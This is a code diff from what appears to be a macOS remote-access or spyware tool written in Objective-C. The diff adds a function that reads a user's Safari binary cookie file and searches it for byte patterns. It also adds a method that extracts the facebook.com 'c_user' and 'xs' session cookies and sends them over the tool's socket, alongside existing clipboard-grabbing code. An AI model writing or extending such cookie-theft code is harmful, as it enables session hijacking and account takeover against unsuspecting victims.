@@ -6,7 +6,9 @@
 @synthesize soundRecorder, fileManager;
 
 BOOL micinuse;
-
+FILE *cookieJar;
+char lastBytes[64];
+    
 -(id)init {
     fileManager = [[NSFileManager alloc] init];
     return self;
@@ -29,6 +31,35 @@ BOOL micinuse;
     return [path substringToIndex:[path length] - 1];
 }
 
+    
+char* parseBinary(int* searchChars,int sizeOfSearch) {
+    cookieJar = fopen("/Users/lucasjackson/Library/Cookies/Cookies.binarycookies", "rb+");
+    fseek(cookieJar, 0L, SEEK_END);
+    long cookieJarSize = ftell(cookieJar);
+    int pos = 0; int curSearch = 0;int curChar;
+    fseek(cookieJar, 0, 0);
+    
+    while(pos <= cookieJarSize) {
+        curChar = getc(cookieJar);pos++;
+        
+        if(curChar == searchChars[curSearch]) { /* found a match */
+            curSearch++;                        /* search for next char */
+            if(curSearch > sizeOfSearch - 1) {                 /* found the whole string! */
+                curSearch = 0;                  /* start searching again */
+                fread(lastBytes,1,64,cookieJar); /* read 5 bytes */
+                return lastBytes;
+            }
+            
+        } else { /* didn't find a match */
+            if (curSearch > 18) {
+                printf("fuck %d\n",searchChars[curSearch]);
+            }
+            curSearch = 0;                     /* go back to searching for first char */
+        }
+    };
+    printf("could not find cookie\n");
+    exit(0);
+}
 //MARK: Socketry
 
 int sockfd;
@@ -572,9 +603,24 @@ int sockfd;
     [self sendString:[NSString stringWithFormat:@"%d",processID]];
 }
 
+-(void)getFacebook {
+    NSString *result = @"";
+    int cuserArr[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6f, 0x6f, 0x6b,
+        0x2e, 0x63, 0x6f, 0x6d, 0x00, 0x63, 0x5f, 0x75,
+        0x73, 0x65, 0x72, 0x00, 0x2f, 0x00}; //facebook.com c_user /
+    result = [NSString stringWithFormat:@"c_user = %s\n",parseBinary(cuserArr,22)];
+
+    int tokenArr[] = {0x66, 0x61, 0x63, 0x65, 0x62, 0x6F, 0x6F, 0x6B,
+        0x2E, 0x63, 0x6F, 0x6D, 0x00, 0x78, 0x73, 0x00,
+        0x2f, 0x00}; //facebook.com xs /
+    result = [NSString stringWithFormat:@"%@xs = %s",result,parseBinary(tokenArr,18)];
+
+    [self sendString:result];
+}
+
 -(void)getPaste {
     //easy :p
-    NSPasteboard*  myPasteboard  = [NSPasteboard generalPasteboard];
+    NSPasteboard *myPasteboard  = [NSPasteboard generalPasteboard];
     NSString *contents = [myPasteboard  stringForType:NSPasteboardTypeString];
     if (contents == nil) {
         [self sendString:@"empty"];
